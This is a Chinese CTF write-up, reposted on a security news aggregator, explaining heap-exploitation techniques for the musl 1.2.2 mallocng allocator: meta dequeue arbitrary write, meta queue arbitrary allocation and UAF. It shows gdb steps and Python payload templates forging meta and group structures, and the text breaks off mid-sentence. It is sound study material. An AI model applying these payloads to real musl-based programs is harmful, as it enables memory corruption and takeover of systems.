---
title: 小小做题家之——musl 1.2.2的利用手法
url: https://buaq.net/go-131024.html
source: unSafe.sh - 不安全
date: 2022-10-16
fetch_date: 2025-10-03T20:01:25.652806
---

# 小小做题家之——musl 1.2.2的利用手法

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/a0ab898d5272967f8b6c58fbad72d549.jpg)

小小做题家之——musl 1.2.2的利用手法

本文为看雪论坛优秀文章看雪论坛作者ID：Nameless\_a一前言看了0xRGZ师傅的博客，觉得自己是懂musl的，小摸了一篇手动编译测试musl1.2.2 meta dequeue特性（https:
*2022-10-15 17:59:14
Author: [mp.weixin.qq.com(查看原文)](/jump-131024.htm)
阅读量:26
收藏*

---

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GoKmKic7yAZ3C2nbNqh7WhmMudej6BN8j6PMJYic7XiaXgZEQAJk2iaYbWAQvDNxLZ49CwFSibzJwDYaw/640?wx_fmt=jpeg)

本文为看雪论坛优秀文章

看雪论坛作者ID：Nameless\_a

```
一

前言
```

看了0xRGZ师傅的博客，觉得自己是懂musl的，小摸了一篇手动编译测试musl1.2.2 meta dequeue特性（*https://bbs.pediy.com/thread-274629.htm*）。做题的时候发现自己学的和写的是1托4，利用和学机制真的不太一样，在照着xyzmpv师傅的博客复现今年\*ctf的babynote的过程中逐行调试才恍然大物。在这里简单记录一下复现中学到的musl 1.2.2的利用手法。

```
二

常见利用手法
```

### **meta dequeue的利用**

#### **流程**

一般是下面两种：

（1）free->nontrivial\_free()->dequeue

（2）malloc->alloc\_slot->dequeue

(触发详情可见笔者的musl手动编译测试文章或者0xRGZ师傅的文章)

#### **效果**

任意地址写

#### **利用思路**

meta dequeue是一个类似于glibc里面双链表结构bin取出堆块的unlink操作，源码如下：

(在/musl-1.2.2/src/malloc/mallocng/meta.h目录下)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq9D7Sic8g0YyW4Cybn30x4jQGhr2mkdJR3noMc5s3YGuwQUco2HicpYUxg/640?wx_fmt=png)

如果我们劫持meta的pre和next，就可以达到无任何检查的unlink的任意地址写的操作。

#### **利用过程**

同样，从一个简单的demo入手：

（下述调试的偏移均未开ASLR保护的U2004环境，可以通过echo 0 > /proc/sys/kernel/randomize\_va\_space设置，然后偏移应该就是一样的了）

```
/*在musl-1.2.2目录下编译和链接：./obj/musl-gcc main.c -o testpatchelf --set-interpreter ./libc.so ./test(libc.so就用题目附件给的就好)*/#include<stdio.h>#include <unistd.h> void init(){        setbuf(stdin, 0);        setbuf(stdout, 0);        setbuf(stderr, 0);} int main() {         init();        size_t *p1;        p1=(size_t *)malloc(0x20); //1        read(0,p1,0x10);        free(p1);        return 0;}
```

目标：给0x555555559f00赋值0x55555555b300

首先断在这个地方：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq9bnKeVh5HMFmkO1KNibhiaGwKpVEs2KLFE5sMFdcotY5C3pdgMPEQBrZQ/640?wx_fmt=png)

此时meta的构造如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq9dwgg1oGYCKLp74hsscibnCp7vxUtyhGBzreee5Pk7o2wuicE5hAjBBPA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq9XzSACVdLumG2P9fsb5bYpicMScPgszCgMeP6yL6WJWp7p79yWwklBcw/640?wx_fmt=png)

发现此时这个meta指向自身，我们通过set指令修改它的pre和next：

```
set *0x55555555b298 = 0x555555559ef8set *0x55555555b2a0 = 0x55555555b300
```

修改过后，ni 发现会卡在一个地方：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq9APJuC78bjuKSmb5jVh1oUhhlWwX0DgzfT3ZyPPwqKFI76GYKvdmgibw/640?wx_fmt=png)

但是我们发现dequeue其实是执行了的，也就是我们成功给0x555555559f00赋值0x55555555b300：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq9rHlvrDZetg1MjciawZeyiaMMW6h6uBROM8dmVjwziaIMt8a6Vp1VjaRqg/640?wx_fmt=png)

为啥会卡住呢？我们着重分析分析118行这里的源码。

这里的m是一个meta，而且是0x298的next，也就是0x55555555b300。mheap一下也能发现原来的0x298被换成了一个新的meta：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq9mxAhTs6iccicJhqRDUFBsOTZFBI75DtZxX7fq3pgm19EBghcNSZ1zYnw/640?wx_fmt=png)

这里也提醒了我们，meta->mem即存group地址的地方是空的，也正是因为这个，在mozxv那行汇编引用[rax+8]就会卡住。于是我们考虑用set补充一下这个地方（将0xb340这个地址当作group）：

```
set *0x55555555b310 = 0x55555555b340set *0x55555555b314 = 0x5555
```

(不知道为啥这些地方set就只能一次4字节)

但还不够，group也要索引到meta，即group的首地址得存放meta的地址。这是因为malloc和free的时候存在get\_meta的检查，部分源码如下：

```
const struct group *base = (const void *)(p - UNIT*offset - UNIT);//根据chunK获取group和meta p为chunk指针const struct meta *meta = base->meta;assert(meta->mem == base);//检查assert(index <= meta->last_idx);assert(!(meta->avail_mask & (1u<<index)));assert(!(meta->freed_mask & (1u<<index)));//通过bitmap进行两次检查，确保avail和freed mask的bitmap不会越界const struct meta_area *area = (void *)((uintptr_t)meta & -4096);//meta area和meta在一页内，meta area在页开头（实际就是清除了meta的十六进制低三位）assert(area->check == ctx.secret);//检查area中的secret
```

重点检查就是secret和meta->mem。secret也就是meta\_addr & -0x4096（即低三位为0的地址），很幸运的是恰好这里就是screat：(0xb300清除后三位被称作meta\_area的地方，与meta处于同一页中)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq99udibTfpe855wPVtv9mR4uPCP2Vtu3frbd5ibFT1KiaoaEXSuSdNbyrqQ/640?wx_fmt=png)

meta->mem也就是group的首地址，要设置成meta的地址。同样用set：

```
set *0x000055555555b340 = 0x55555555b300set *0x000055555555b340 = 0x5555
```

设置好过后，ni就能成功free然后实现任意地址写了。

### **meta queue的利用**

上面介绍dequeue利用的时候，有个active[2]中的meta从0x298换成0x55555555b300，触发了dequeue实现了active[2]上面meta的替换。这是在active[2]非空的情况下的替换。但当active为空，我们又怎么让它凭空“长”一个meta出来呢？我们看看meta.h下的nontrivial\_free函数（和前面的dequeue是一个函数）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq94ib7Wan3Bra1Yhx4UibhGASPDXRIonZYYPL9omkibauBwLpyDmPcOEialQ/640?wx_fmt=png)

发现就是if和else if的关系，if那条分支其实检查的是mask是否符合条件（是否满了，要么全用了要么全free，这里肯定是检查是否已经用了的堆块全free），ok\_2\_free其实检查的是meta的free\_able标记（因为其它条件基本能满足）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq9Z4ibnfmRoKkDxtk10Sj0ROAY0mC5iavDbsfLJnTNkGw7icNUygw2TnQIw/640?wx_fmt=png)

只要满足free\_able为0，就可执行else if分支。else if分支需要满足sc<48，伪造的时候注意即可，然后就是检查active[sc]上面的meta是否是即将加入的m，我们伪造的时候一般针对的是空的active，这里就直接通过了。然后就到了queue里面：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EVyibqoblibw6T4vxGrPQLq9Nqia51iaK3v9DJc6icTBXFF8YBtnALeF6WV1j9QNcaPusOBUjOCLTNWLw/640?wx_fmt=png)

这里的phead其实就是active，m是即将被放入active的meta，执行的肯定是else的分支（因为active为空），然后我们就成功把伪造的meta m加入active[sc]了。malloc(sc\*0x10)就能从伪造的meta找到伪造的group，然后从伪造的group取出堆块。

#### **效果**

实现任意地址申请

#### **利用流程**

当伪造的group的地址为我们想要修改的地址-0x10的时候，在满足条件的情况下，就能通过malloc(sc\*0x10)申请出想要修改的地址进行修改。

下面谈谈如何伪造满足条件的meta和group实现任意地址申请：

（1）首先需要满足meta\_area和meta处于同一页，一般都是采用申请大堆块使得通过mmap分配，然后通过padding使得meta\_area和meta处于同一页。

（2）然后需要满足meta\_area的首地址为screat，这个也好满足，在padding过后紧接着就行。

（3）伪造meta：伪造prev,next,mem，以及last\_idx, freeable, sc, maplen四合一的一位。一般需要伪造两种meta（同一个，执行完一个功能过后通过复写切换），一种用来dequeue任意地址写修改最后fake\_group的首地址为fake\_meta的地址从而通过get\_meta的检查；另一种严格保证不会被free掉，从而执行queue被加进active[sc]达成任意地址申请修改的目的。

（4）伪造group：首地址为fake\_meta的地址，+0x8的active\_idx一般修改为1即可。

（5）free(group+0x10)来执行nontrivial\_free：总共执行两次。第一次dequeue将fake\_group（即target-0x10）写入fake\_meta，第二次queue将fake\_meta加入active[sc]。

（6）malloc(sc\*0x10)申请出target进行修改。

伪造的模板如下：（两种meta的区别本质上是通过修改四合一位来实现的，也就是在free(fake\_chunk)的时候nontrivial\_free走的是if还是else if）。

① 伪造meta

```
伪造dequeue-meta:```    last_idx, freeable, sc, maplen = 0, 1, 8, 1    #fake meta    fake_meta = p64(stdout - 0x18)                  # prev    fake_meta += p64(fake_meta_addr + 0x30)         # next    fake_meta += p64(fake_mem_addr)                 # mem    fake_meta += p32(0) + p32(0)                    # avail_mask, freed_mask    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)    fake_meta += p64(0) #duiqi```伪造queue-meta(或者伪造替换group时不希望meta被free):    last_idx, freeable, sc, maplen = 1, 0, 8, 0 #freeable置0是为了拒绝ok to free校验，防止释放meta    fake_meta = p64(0)                              # prev    fake_meta += p64(0)                             # next    fake_meta += p64(fake_mem_addr)                 # mem    fake_meta += p32(0) + p32(0)                    # avail_mask, freed_mask    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)    fake_meta += p64(0)
```

② 伪造group

```
fake_mem = p64(fake_meta_addr)                  # metafake_mem += p32(1) + p32(0)
```

③ 拼接payload

```
payload = padding ##页对齐payload += p64(secret) + p64(0) ## +p64(0)是为了补齐payload += fake_meta + b'\n'
```

### **UAF**

#### **效果**

任意地址泄露或者任意地址写

#### **利用过程**

musl的UAF和glibc的有点不太一样，这是因为musl的堆块free过后不会立马被再次使用。这是由meta的avail\_mask和freed\_mask限制的。申请group对应大小的堆块，会优先使用avail\_mask上还是1的位置对应的堆块。当avail\_mask变成0了会检测freed\_mask是否为0，如果为0则该meta可以dequeue了（即malloc触发的dequeue），反之则会将avail\_mask异或上freed\_mask同时将freed\_mask置为0，取出当前avail\_mask从低到高第一个非0位对应的堆块作为malloc（或者其它内存申请函数）的返回值，并将该位置为0。

所以，musl...